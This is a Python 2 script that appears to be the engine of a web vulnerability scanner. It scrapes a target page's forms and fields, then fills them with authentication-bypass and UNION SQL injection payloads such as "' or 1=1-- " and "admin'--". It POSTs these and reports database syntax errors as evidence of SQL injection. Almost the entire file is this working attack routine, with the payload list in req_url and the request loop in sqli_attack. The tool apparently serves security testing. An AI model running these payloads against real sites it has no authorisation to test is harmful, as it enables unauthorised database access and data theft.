# -*- coding: utf-8 -*-
'''
Created on 2016. 7. 20.
@author: jhj
'''
import sys
import urllib, urllib2, cookielib
from py4j.java_gateway import JavaGateway, GatewayParameters
import mechanize
import time

def url(url):
    
    #print "url", url
    scan_url = url;
    today = time.localtime()
    scanTime = "%04d-%02d-%02d %02d:%02d:%02d" % (today.tm_year, today.tm_mon, today.tm_mday, today.tm_hour, today.tm_min, today.tm_sec)
    #print "=========================================="
    #print "[1] ",url,scanTime
    #wvResult("url",scan_url)
    #wvResult("date",scanTime)
    
    return scan_url,scanTime
    
    #java_url.target_date(url,scanTime)
    
    #scan_header(url)
    
               
def scan_header(url):
    print url, " \nopen..."
    opener = urllib.urlopen(url)
    #print "url ..."
    if opener.code == 200:
        print "url status: 200 ok"
        #print "header infor....\n",opener.headers 
        #print opener.headers
        return True    
    elif opener.code == 404:
        return False
    
def form_mechanize(url):
   
    cj = mechanize.CookieJar()
    br = mechanize.Browser()  
    br.set_cookiejar(cj)
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    #br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #print "mechanize browser.open...."   
    br.open(url)
    
    formname = []
    userTagId = []
    formSubmit = []
   
    for form in br.forms():
        print form
        
        formname.append(form.name)  
    
    print "-------------[*] formname list up-----------"     
    print formname
    
    for names in formname :
        
        if names != "None":
            test = names
            #print "*****formname output saving....*****"
            #java_url.search_formname("formname",test)
    formSubmit.append(test)
    br.select_form(name=test) 
    for control in br.form.controls:
       
        if control.name != "None":    
            if control.type != "submit" :
                userTagId.append(control.name)
                #print "*****tagid output saving....*****"
                #java_url.search_formname("tagid",control.name)
            else:
                formSubmit.append(control.name)
                     
    print "-------------[*] form input id list up-----------"
    print userTagId   
    #print "*****forminfo all output saving....*****"
    #java_url.saveFormInfo()   
    return formname,userTagId 

def req_url(url, tagIdList):
    sqli_pattern = {'pattern1':"'or'1'='1", 'pattern2':"'or'1'='2", 'pattern3':"' or 1=1-- ",
                  'pattern4':"' or 1=1#", 'pattern5':"admin' #",
                  'pattern6':"'union select 1  limit 1, 1%23",
                  'pattern7':"'", 'pattern8':"a' or 1=1 --", 'pattern9':"')or(x'='x",
                  'pattern10':"admin'--"}
    

    plist = []
    payload = {}
    payloads = []
    
    for p in sqli_pattern.keys():  # sql 패턴의 키 값을 추출 
        plist.append(p)  # 추출한 키 값을 순서대로 삽입
        # print "plist"
        # print plist #추출한 키값을 리스트로 저장 
    for pattern in plist:
        payload = {}
        
        for tagId in tagIdList:
            # payload={tagId:sqli_pattern.get(pattern)}
            #print tagId, sqli_pattern.get(pattern)
            # if tagId!=payload[tagId]:
            payload[tagId] = sqli_pattern.get(pattern)
        payloads.append(payload)
    #print "[*req_url method payloadlist :]",payloads    
    return payloads 
    #sqli_attack(url, res)

def sqli_attack(url, result):
    
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    sqliError=[]
    sqlErrorlist =[]
    dberrorlist=[]
    patternlist =[]
    vulname="SQL Injection"
    patternname = "Syntax Error"
    patterncomment = "정상적인 쿼리가 아닌 비정상적인 쿼리를 통해 의도적인 에러 발생 후 데이터 베이스 정보 유출 가능성이 있음 "
    #print "result length : ",len(result)
    
    
    
    for re in result:
        
        print "sqli_attack method area",re
        data = urllib.urlencode(re)
           
        try:
            request = urllib2.Request(url, data)
            res = opener.open(request)
           # print "****************************"
           
            print re, "-----------------------"
            print res.read()
            #print "----------------------"
            res.close()
        except urllib2.HTTPError, error:
             #content = error.read()
            if error.getcode() == 500:
                # print "*****----------------*************"
                dberror = error.read()
                if "Syntax error (missing operator) in query expression" in dberror:
                    print "vulinfo",",",vulname,",",patternname,",",re,",",str(patterncomment)
                    test = vulname,patternname,re,str(patterncomment)
                    sqlErrorlist.append(test)
                elif "Syntax error in string in query expression" in dberror:
                     print "vulinfo",",",vulname,",",patternname,",",re,",",str(patterncomment)
                     test = vulname,patternname,re,str(patterncomment)
                     sqlErrorlist.append(test)
                
    #print sqlErrorlist,len(sqlErrorlist)
    return sqlErrorlist
    
if __name__ == "__main__":
    gateway = JavaGateway()
    #print "**************************************"
    #print "python start!!!!스타트트트트트......"
    #print "**************************************"
    #print "python py4j gateway start......"
    java_url = gateway.entry_point.getStack() # 브라우져
    #print "**************************************"
   # print "python py4j getUrl call......"
    url,date =url(java_url.getUrl())
    #print "**************************************"
    print "urldate,",str(url),",",str(date)
    #print "**************************************"
    status = scan_header(url)
    #print "status :", status,"check"
    if status == True:
        #print "status true!!"
        formNameList,tagIdList = form_mechanize(url)

        #print "**************************************"
        for formname in formNameList:
            te = formname
        #print str(te)
        print "formname,",te
        print "tagid",",",','.join(tagIdList)    
            
        #print "[2] formnamelist: ",str(formNameList),"tagidlist: ",str(tagIdList),"확인"
        #print "**************************************"
        payloads =req_url(url, tagIdList)
        #print "**************************************"
        #print "[3] payload : ",payloads,"check"
        #print "**************************************"  
        sqlerrorlist =sqli_attack(url, payloads)
        '''
        print "******************************************"
        #print " ".join(sqlerrorlist)
        test=[]
        for i in sqlerrorlist:
            test.append(list(i)) 
            
            for j in i:
               print j
            
        print test
        
        for t in test:
            print (str(t))
        '''
    else :
        print "page was not found check it"
        exit()
        
       
    
    
